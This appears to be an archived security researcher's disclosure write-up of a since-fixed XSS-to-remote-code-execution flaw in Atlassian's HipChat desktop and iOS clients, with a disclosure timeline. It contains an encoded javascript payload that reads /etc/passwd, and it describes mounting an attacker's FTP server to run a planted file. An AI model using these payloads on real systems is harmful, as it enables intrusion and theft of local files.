---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2015-11-15_xss-to-rce-in-atlassian-hipchat.md
original_filename: 2015-11-15_xss-to-rce-in-atlassian-hipchat.md
title: XSS to RCE in Atlassian Hipchat
category: documents
detected_topics:
- command-injection
- mobile-security
- xss
- automation-abuse
tags:
- imported
- documents
- command-injection
- mobile-security
- xss
- automation-abuse
language: en
raw_sha256: 241928de9c7a5b995b2d96c0a564b128ea2e528f0e0ab40c4fb8d171e1bf5fda
text_sha256: 521d76b962b2ed62b914442c96095f0d154af87d74102f3ac73891006b4f4907
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# XSS to RCE in Atlassian Hipchat

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2015-11-15_xss-to-rce-in-atlassian-hipchat.md
- Source Type: markdown
- Detected Topics: command-injection, mobile-security, xss, automation-abuse
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `241928de9c7a5b995b2d96c0a564b128ea2e528f0e0ab40c4fb8d171e1bf5fda`
- Text SHA256: `521d76b962b2ed62b914442c96095f0d154af87d74102f3ac73891006b4f4907`


## Content

---
title: "XSS to RCE in Atlassian Hipchat"
page_title: "maustin.net  | XSS to RCE in Atlassian Hipchat"
url: "https://maustin.net/2015/11/12/hipchat_rce.html"
final_url: "https://maustin.net/2015/11/12/hipchat_rce.html"
authors: ["Matt Austin (@mattaustin)"]
programs: ["Atlassian"]
bugs: ["XSS", "RCE"]
publication_date: "2015-11-15"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6330
---

**Note: This issue has been resolved (months ago… I have been lazy).**

Two issues exist in Atlassian’s HipChat desktop client that allow an attacker to retrieve files or execute remote code when a user clicks on a cleverly crafted URL. This vulnerability works against OS X version 3.0.6 (132), iOS 2.3.3 (20307) and potentially others.

## XSS in a Native App?

To render things like images, videos, and emoticons HipChat clients use an embedded Webkit engine. OS X, Windows, and iOS clients parse URLs incorrectly converting text with the “javascript:” protocol into links. But what does XSS get us in a native application? In this case it led to Local file access (full read) and eventually **remote code execution**!

## The XSS

The client examines incoming messages looking for messages that contain data it should transform. The client supports common protocols such as “http://”, “ftp://”, and “file://”. In addition the parser seems to support [any word][the colon character][a forward slash][another slash or word]. Any match for this pattern is turned into a clickable link for user convenience.

One quick issue to get around, HipChat expects a slash after the colon ex: blah:/. That means our Javascript has to start with a /. We can get around this simply by adding a second slash followed by a newline. This results in a comment, a newline, then our code. (javascript://some_comment%0aANY_JAVASCRIPT).

Now we are cooking!!

## Remote Code Execution

Now things start to get fun! When clicking a link, Hipchat tries to open that link “externally” with your default browser. It does this by delegating to the OS “Open this protocol (http://) with your default handler (usually a browser).”. But what if the protocol is “file://”? The OS knows eactly what to do with that, it **runs it**. Now with the XSS from above we can do a javascript redirect to: “file:///Applications/Calculator.app” will cause the calculator to open. Unfortunately this will only work for applications on the target computer, and will not allow us to pass any arguments.

### Run My File

We need to be able to introduce our own application or script, but how? We need a file that we control in a known location.

Now this is something truly crazy to me. What is the default behavior if we delegate ftp:// link? Well, when the FTP URL contains a username and password OS X it **automatically connects**. It treats it as a volume and automatically mounts it. ftp://anonymous:[[email protected]](/cdn-cgi/l/email-protection)/ will automatically connect and be mounted to file:///Volumes/104.131.88.251/.

SO put that with the XSS from above and we get one click XSS to RCE:

**POC:**

**POC Desktop Image:**

![Details](/img/hipchat_desktop.png)

Note: In this example we use a .terminal file for a specific reason. Terminal.app has a property file with an option to specify a startup command. This is necessary to run things from a specific path while bypassing any code signing or executable permission requirement on a standard shell script. Hack.app also exists in this directory and would also execute.

## Bonus File Desclousure

We have the XSS is the mobile app as well, but not the RCE, but what can we do? With this “XSS” we can make an XHR request to the local file system, using “file://”. We take advantage of a weakness in the “Same Origin Policy” in the embedded Webkit engine. A second Ajax request can send that data to a remote URL. This would allow an attacker to steal any local documents like configuration files, cached files, cookies or chat logs. This is true for both iOS and OSx.

**Encoded URL:**
  
  
  javascript://comment%0a%72%3d%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%72%2e%6f%70%65%6e%28%27%47%45%54%27%2c%27%66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64%27%2c%66%61%6c%73%65%29%3b%0a%72%2e%73%65%6e%64%28%6e%75%6c%6c%29%3b%0a%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%27%63%68%61%74%5f%74%65%78%74%27%29%2e%69%6e%6e%65%72%48%54%4d%4c%3d%72%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b
  

**Plain text:**

**iOS POC:**

![](/img/hipchat_iphone.png)

## Disclosure

  * First e-mail to Atlassian that I discovered the issue.
  * Same day reply “we are looking into it” (thumbsup)
  * At some point Atlassian replies saying “someone internally already found this issue”, and this disqualified me from the “Atlassian Security Hall of Fame”.
  * I send them 2 more XSS vectors (urls for github project home page and user “blog”). I also really try to explain that the XSS only makes the exploit one click. The protocol handler is the real issue leading to RCE.
  * With the XSS still working in web, desktop, and mobile apps after 20 days and 2 automatic updates without a fix I pushed for a little more information. Still working on it / waiting to deploy.
  * Two months and a few desktop versions later the bug was fixed.
  * They send me a free T-shirt.

As of today the app still doesn’t appear to handle protocols correctly. The app is still one XSS away from another RCE. Can’t wait to see some of the new [API intergration features](https://ecosystem.atlassian.net/wiki/display/HIPDEV/HipChat+Sidebar).

**Update:** Atlassian did end up adding me to the hall of fame. I believe when I reported this was right when Hipchat was being merged into Atlissian which explains some of the turn around time. The timeline above makes it sound like it was not a great experience working with them. However that could not be further from the truth. They have been great.
